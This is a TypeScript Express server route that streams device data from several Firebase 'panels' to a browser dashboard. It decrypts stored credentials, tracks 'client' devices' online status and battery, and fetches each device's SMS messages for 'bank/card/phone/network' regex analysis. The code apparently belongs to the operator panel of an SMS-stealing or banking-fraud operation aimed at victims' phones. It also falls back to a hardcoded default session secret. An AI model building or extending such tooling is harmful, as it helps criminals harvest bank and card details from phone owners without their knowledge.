/**
 * Real-Time SSE Stream
 *
 * GET /api/stream
 *   Authenticated endpoint. Opens persistent Firebase SSE connections
 *   for all the user's panel configs and forwards normalized events
 *   to the browser in < 200ms end-to-end.
 *
 * Event types sent to client:
 *   init       — full device snapshot for a panel (on first connect)
 *   update     — single device field change (online/offline, battery, etc.)
 *   heartbeat  — keepalive every 30s
 *   error      — stream error, client should reconnect
 */

import { Router } from "express";
import type { Request, Response } from "express";
import { db } from "@workspace/db";
import { panelConfigs } from "@workspace/db/schema";
import { eq, and } from "drizzle-orm";
import {
  streamFirebasePath,
  normalizeDevice,
  applyPatch,
  fetchSmsAnalysis,
  type NormalizedDevice,
} from "../lib/firebase-stream.js";
import { decrypt } from "../lib/crypto.js";
import { authenticate } from "../middleware/authenticate.js";

const router = Router();
const SESSION_SECRET = process.env.SESSION_SECRET ?? "dev-secret-change-me";

router.get("/", authenticate, async (req: Request, res: Response) => {
  // ── Set up SSE headers ──────────────────────────────────────────────────
  res.writeHead(200, {
    "Content-Type": "text/event-stream",
    "Cache-Control": "no-cache, no-transform",
    Connection: "keep-alive",
    // Prevent nginx/proxy buffering — critical for SSE to work
    "X-Accel-Buffering": "no",
  });
  res.flushHeaders();

  // ── Heartbeat every 30s to keep connection alive ───────────────────────
  const heartbeat = setInterval(() => {
    res.write("event: heartbeat\ndata: {}\n\n");
  }, 30_000);

  // ── AbortController to stop all Firebase streams on disconnect ─────────
  const controller = new AbortController();

  req.on("close", () => {
    controller.abort();
    clearInterval(heartbeat);
  });

  // ── Helper: send an SSE event ──────────────────────────────────────────
  function send(event: string, data: unknown) {
    if (!res.writable) return;
    res.write(`event: ${event}\ndata: ${JSON.stringify(data)}\n\n`);
  }

  // ── Load user's panel configs ──────────────────────────────────────────
  let configs;
  try {
    configs = await db
      .select()
      .from(panelConfigs)
      .where(
        and(
          eq(panelConfigs.ownerId, req.user!.id),
          eq(panelConfigs.isActive, true),
        ),
      );
  } catch (err) {
    send("error", { message: "Failed to load panel configs" });
    res.end();
    return;
  }

  if (!configs.length) {
    // Empty state: keep the stream alive with a heartbeat so the dashboard
    // doesn't crash; the client will simply see zero devices.
    send("init", { panelId: null, panelName: null, devices: [] });
    return;
  }

  // ── Open one Firebase stream per panel config ──────────────────────────
  for (const config of configs) {
    let secret: string;
    try {
      secret = decrypt(config.firebaseSecret, SESSION_SECRET);
    } catch {
      send("error", { message: `Failed to decrypt credentials for panel "${config.name}"` });
      continue;
    }

    // Each panel runs its own async loop independently
    (async () => {
      // Per-panel device cache (id → NormalizedDevice)
      const deviceMap = new Map<string, NormalizedDevice>();
      // Track which devices have already had SMS analysis fetched this session
      const smsFetched = new Set<string>();

      /**
       * Kick off SMS analysis for a set of device IDs in batches of 5.
       * Updates deviceMap in place and emits "update" events as each batch
       * completes — identical to the Profex pattern that loads messages and
       * runs bank/card/phone/network regex after the initial device list.
       */
      function fetchAndPushSmsAnalysis(ids: string[]) {
        const toFetch = ids.filter((id) => !smsFetched.has(id));
        if (!toFetch.length) return;
        (async () => {
          for (let i = 0; i < toFetch.length; i += 5) {
            if (controller.signal.aborted || !res.writable) break;
            const batch = toFetch.slice(i, i + 5);
            await Promise.all(
              batch.map(async (id) => {
                if (smsFetched.has(id)) return;
                smsFetched.add(id);
                const analysis = await fetchSmsAnalysis(
                  config.firebaseUrl,
                  secret,
                  id,
                ).catch(() => null);
                if (!analysis || !deviceMap.has(id) || !res.writable) return;
                const device = deviceMap.get(id)!;
                // eslint-disable-next-line @typescript-eslint/no-explicit-any
                device.smsAnalysis = analysis as Record<string, any>;
                send("update", { panelId: config.id, device });
              }),
            );
          }
        })().catch(() => {});
      }

      try {
        for await (const event of streamFirebasePath(
          config.firebaseUrl,
          secret,
          "clients",
          controller.signal,
        )) {
          if (!res.writable) break;

          if (event.type === "put") {
            // ── Full snapshot on initial connect ──────────────────────
            if (event.data && typeof event.data === "object") {
              deviceMap.clear();
              for (const [id, raw] of Object.entries(
                event.data as Record<string, unknown>,
              )) {
                const device = normalizeDevice(id, raw, config.id);
                deviceMap.set(id, device);
              }
              send("init", {
                panelId: config.id,
                panelName: config.name,
                devices: Array.from(deviceMap.values()),
              });
              // ── Async: fetch SMS analysis and push updates per device ──
              // Profex does this after the initial clients fetch, in batches
              // of 5, emitting updates as each batch completes. We do the
              // same here so the SSE client gets live smsAnalysis without
              // waiting for a full page refresh.
              fetchAndPushSmsAnalysis(Array.from(deviceMap.keys()));
            }
          } else if (event.type === "patch") {
            // ── Partial update — fires instantly on status change ─────
            const pathParts = event.path.replace(/^\//, "").split("/");
            const deviceId = pathParts[0];

            if (!deviceId) continue;

            if (!deviceMap.has(deviceId)) {
              // New device appeared — add it then kick off SMS analysis
              if (event.data && typeof event.data === "object") {
                const device = normalizeDevice(deviceId, event.data, config.id);
                deviceMap.set(deviceId, device);
                send("init", {
                  panelId: config.id,
                  panelName: config.name,
                  devices: [device],
                });
                fetchAndPushSmsAnalysis([deviceId]);
              }
              continue;
            }

            const device = deviceMap.get(deviceId)!;

            if (pathParts.length === 1) {
              // Whole device replaced
              if (event.data && typeof event.data === "object") {
                const updated = normalizeDevice(deviceId, event.data, config.id);
                // Preserve smsAnalysis already fetched for this device
                if (!updated.smsAnalysis && device.smsAnalysis) {
                  updated.smsAnalysis = device.smsAnalysis;
                }
                deviceMap.set(deviceId, updated);
                send("update", { panelId: config.id, device: updated });
              } else if (event.data === null) {
                // Device deleted from Firebase
                deviceMap.delete(deviceId);
                smsFetched.delete(deviceId);
                send("remove", { panelId: config.id, deviceId });
              }
            } else {
              // Single field update (e.g. /deviceId/status, /deviceId/battery)
              applyPatch(device, event.path, event.data);
              send("update", { panelId: config.id, device });
            }
          } else if (event.type === "cancel" || event.type === "auth_revoked") {
            send("error", {
              message: `Panel "${config.name}": Firebase access revoked. Check your credentials.`,
            });
            break;
          }
        }
      } catch (err) {
        if (!controller.signal.aborted) {
          send("error", { message: `Panel "${config.name}" stream error` });
        }
      }
    })();
  }

  // Keep the response open — the async loops above write to it
  // It closes when the client disconnects (req 'close' event)
});

export default router;
